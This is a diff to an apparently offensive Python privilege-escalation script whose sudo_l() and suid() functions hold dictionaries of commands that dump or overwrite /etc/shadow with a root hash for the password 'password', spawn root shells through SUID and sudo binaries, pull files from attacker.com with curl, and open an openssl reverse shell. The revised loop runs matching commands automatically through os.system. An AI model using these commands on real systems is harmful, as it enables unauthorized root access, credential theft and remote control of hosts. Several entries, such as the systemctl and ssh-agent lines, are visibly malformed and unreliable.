@@ -291,7 +291,7 @@ def sudo_l():
       "grep":"sudo grep '' /etc/shadow",
       "gzip":"sudo gzip -f /etc/shadow -t",
       "mount":"sudo mount -o bind /bin/sh /bin/mount&&sudo mount",
-      "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&sudo mv $TF $LFILE&&echo 'su root, passwd is 'password''",
+      "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&sudo mv $TF $LFILE&&echo \"su root, passwd is 'password'\"",
       "mysql":"sudo mysql -e '\\! /bin/sh'",
       "perl":"sudo perl -e \"exec '/bin/sh';\"",
       "php":"CMD='/bin/sh'&&sudo php -r \"system('$CMD');\"",
@@ -338,40 +338,40 @@ def suid():
    os.system("echo ' ' >> /tmp/suid.txt")
 
    suid_bins_print = {
-   "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
-   "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
+   "curl":"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE",
+   "openssl":"(on attack box:) openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n(on target box:) mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <localIP>:<localPORT> > /tmp/s; rm /tmp/s"
    }
 
    suid_bins_exec = {
-   "base64":"./base64 /etc/shadow | base64 --decode",
-   "bash":"./bash -p",
-   "chmod":"./chmod 6777 /etc/shadow&&cat /etc/shadow",
-   "cp":"./cp --attributes-only --preserve=all ./cp /etc/shadow",
-   "dig":"./dig -f /etc/shadow",
-   "docker":"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
-   "env":"./env /bin/sh -p",
-   "file":"./file -f /etc/shadow",
-   "find":"./find . -exec /bin/sh -p \\; -quit",
-   "gzip":"./gzip -f /etc/shadow -t",
-   "mosquitto":"./mosquitto -c /etc/shadow",
-   "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&./mv $TF $LFILE&& echo 'su root: passwd is 'password''",
-   "nmap":"LFILE=/etc/shadow&&./nmap -oG=$LFILE root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::&& echo 'su root, passwd is 'password''",
-   "openvpn":"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c 'sh -p''",
-   "perl":"./perl -e 'exec '/bin/sh';'",
-   "php":"CMD='/bin/sh'&&./php -r 'pcntl_exec('/bin/sh', ['-p']);'",
-   "python":"./python -c 'import os; os.execl('/bin/sh', 'sh', '-p')'",
-   "rsync":"./rsync -e 'sh -p -c 'sh 0<&2 1>&2'' 127.0.0.1:/dev/null",
-   "ssh-agent":"./ssh-agent /bin/ -p",
-   "ssh-keygen":"./ssh-keygen -D ./lib.so",
-   "ssh-keyscan":"./ssh-keyscan -f /etc/shadow",
-   "sshpass":"./sshpass /bin/sh -p",
-   "strings":"./strings /etc/shadow",
-   "systemctl":"TF=$(mktemp).service&&echo '[Service]&&Type=oneshot&&ExecStart=/bin/sh -c 'id > /tmp/output'&&[Install]&&WantedBy=multi-user.target' > $TF&&./systemctl link $TF&&./systemctl enable --now $TF",
-   "unzip":"./unzip -K shell.zip&&./sh -p",
-   "vim":"./vim -c ':py import os; os.execl('/bin/sh', 'sh', '-pc', 'reset; exec sh -p')'",
-   "wc":"./wc --files0-from /etc/shadow",
-   "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&./wget --use-askpass=$TF 0",
-   "zsh":"./zsh"
+   "base64":"base64 /etc/shadow | base64 --decode",
+   "bash":"bash -p",
+   "chmod":"chmod 6777 /etc/shadow&&cat /etc/shadow",
+   "cp":"cp --attributes-only --preserve=all ./cp /etc/shadow",
+   "dig":"dig -f /etc/shadow",
+   "docker":"docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+   "env":"env /bin/sh -p",
+   "file":"file -f /etc/shadow",
+   "find":"find . -exec /bin/sh -p \\; -quit",
+   "gzip":"gzip -f /etc/shadow -t",
+   "mosquitto":"mosquitto -c /etc/shadow",
+   "mv":"LFILE=/etc/shadow&&TF=$(mktemp)&&echo 'root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::' > $TF&&mv $TF $LFILE&& echo \"su root: passwd is 'password'\"",
+   "nmap":"LFILE=/etc/shadow&&nmap -oG=$LFILE root:$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1:18009:0:99999:7:::&& echo \"su root, passwd is 'password'\"",
+   "openvpn":"openvpn --dev null --script-security 2 --up \"/bin/sh -p -c 'sh -p'\"",
+   "perl":"perl -e \"exec '/bin/sh';\"",
+   "php":"CMD='/bin/sh'&&php -r \"system('$CMD');\"",
+   "python":"python3 -c 'import os; os.system(\"/bin/sh\")'",
+   "rsync":"rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
+   "ssh-agent":"ssh-agent /bin/ -p",
+   "ssh-keygen":"ssh-keygen -D lib.so",
+   "ssh-keyscan":"ssh-keyscan -f /etc/shadow",
+   "sshpass":"sshpass /bin/sh -p",
+   "strings":"strings /etc/shadow",
+   "systemctl":"TF=$(mktemp).service&&echo '[Service]&&Type=oneshot&&ExecStart=/bin/sh -c \"id > /tmp/output'&&[Install]&&WantedBy=multi-user.target\" > $TF&&systemctl link $TF&&systemctl enable --now $TF",
+   "unzip":"unzip -K shell.zip&&./sh -p",
+   "vim":"vim -c \":py import os; os.execl('/bin/sh', 'sh', '-pc', 'reset; exec sh -p')\"",
+   "wc":"wc --files0-from /etc/shadow",
+   "wget":"TF=$(mktemp)&&chmod +x $TF&&echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF&&wget --use-askpass=$TF 0",
+   "zsh":"zsh"
    }
 
    # find suid binaries, loop through dictionaries and print cmds if need user interaction, otherwise execute
@@ -395,10 +395,12 @@ def suid():
       for line in suid:
          for key in suid_bins_exec:
             if key in line:
+               key = key.strip()
                print("\n{}: {}".format(key,suid_bins_exec[key]))
                os.system("echo '### {} is a suid file and can be used for privilege escalation ###' >> /tmp/suid_esc.txt".format(key.strip()))
-               suid_cmd = value.strip()
-               os.system("{}".format(suid_cmd))
+               cmd = suid_bins_exec[key].strip()
+               print(cmd)
+               os.system("{}".format(cmd))
                break
             else:
                continue
